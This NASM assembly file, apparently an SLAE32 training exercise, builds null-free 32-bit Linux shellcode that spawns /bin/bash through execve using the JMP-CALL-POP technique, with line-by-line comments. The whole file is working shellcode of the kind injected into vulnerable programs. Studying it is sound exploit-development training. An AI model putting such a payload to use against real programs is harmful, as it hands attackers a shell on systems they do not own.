; execve-JMP_CALL_POP.nasm
; SLAE32
; EXECVE using JMP CALL POP method, no NULL
; 
; int execve(const char *pathname, char *const argv[], char *const envp[]);
;   - execve does NOT need a return if successful
; EAX = syscall
; EBX = /bin/bash, 0x0
; ECX = Address of /bin/bash, 0x00000000
; EDX = 0x00000000
; ESI -> /bin/bash
;
; [!] ===========================================================================
; IMPORTANT NOTE: This will NOT work using NASM compiled code with default ld
; The .text section has to be MADE writeable using ld -N
; ld -N makes the .text and .data segments READABLE and WRITEABLE
; [!] ===========================================================================

global _start

section .text
_start: 
    jmp short call_shellcode

shellcode:
    pop esi                             ; Contains the address to /bin/bashABBBBCCCC string

    xor ebx, ebx
    mov byte [esi + 9], bl              ; MOV 0x0 into 9th character aka the A in the /bin/bashABBBBCCCC (Remember, everything starts at 0)

    mov dword [esi + 10], esi           ; Move the address from ESI register (which contains /bin/bash string) into the 10th character of the ESI string, where the Bs start in the /bin/bashABBBBCCCC
    mov dword [esi + 14], ebx           ; Convert CCCC to 0x00000000

    lea ebx, [esi]                      ; Move the prepped /bin/bash,0x0 into EBX
    
    lea ecx, [esi + 10]                 ; Address of /bin/bash,0x0, where the B's were previously

    lea edx, [esi + 14]                 ; 0x00000000, where the C's were previously

    xor eax, eax
    xor al, 0xb
    int 0x80

call_shellcode:
    call shellcode
    message db "/bin/bashABBBBCCCC"     ; A needs to become 0x0 AKA null-terminated